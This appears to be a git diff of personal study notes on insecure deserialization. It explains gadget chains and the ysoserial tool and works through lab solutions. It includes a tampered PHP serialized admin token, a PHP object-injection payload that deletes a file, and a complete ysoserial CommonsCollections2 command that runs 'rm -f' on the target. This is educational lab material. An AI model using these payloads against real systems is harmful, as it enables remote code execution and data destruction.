@@ -92,7 +92,15 @@ private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundE
 * It is occassionally possible to exploit insecure deserialization by simply editing the object supplied by the website; however, injecting arbitrary object types can open up many more possibilities. In object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization.
 * Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.
 * If an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit.
-* Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a "gadget chain". 
+* Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a "gadget chain".
+
+#### Gadget Chains
+* A gadget is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. It's important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that invoked during deserialization, sometimes known as a "kick off gadget".
+* In the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.
+
+#### Working with Pre-Built Gadget Chains
+* Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first. There are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites. Even if you don't have access to the source code, you can use these tools to both identify and exploit insecure deserialization vulnerabilities with relatively little effort. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.
+* **ysoserial**: One such tool for Java deserialization is ysoserial. This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually. 
 
 #### Lab: Modifying Serialized Objects
 * Decoding the session token as Base64 results in `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`. Flipping 0 to 1 and then attaching the session token to the request to `GET /admin/delete?username=carlos` to delete Carlos.
@@ -156,3 +164,17 @@ class CustomTemplate {
 ?>
 ```
 - I found a very similar exploit path on OWASP: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection. My initial guess was then this: `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}` - AND IT WORKED!!!
+
+#### Lab: Exploiting Java Deserialization with Apache Commons
+* Need to use ysoserial (`java -jar ysoserial-all.jar`) for this to delete morale.txt from Carlos's home directory, `/home/Carlos/morale.txt`.
+* `Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'` so `java -jar ysoserial-[version]-all.jar [payload] 'rm -f /home/Carlos/morale.txt'` EXCEPT, I am on Java 25, and you need to run a different command structure for modern Java (past 16). I first tried it with CommonCollections1 as the payload, and it did not work, but then I tried CommonCollections2, and it solved the lab:
+```
+java \
+--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+--add-opens=java.base/java.net=ALL-UNNAMED \
+--add-opens=java.base/java.util=ALL-UNNAMED \
+--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
+-jar ysoserial-all.jar CommonsCollections2 'rm -f /home/carlos/morale.txt' | base64 -w 0
+```
+* I replaced the serialized session token with the base64 encoded object, using Hackvertor to URL encode it. 
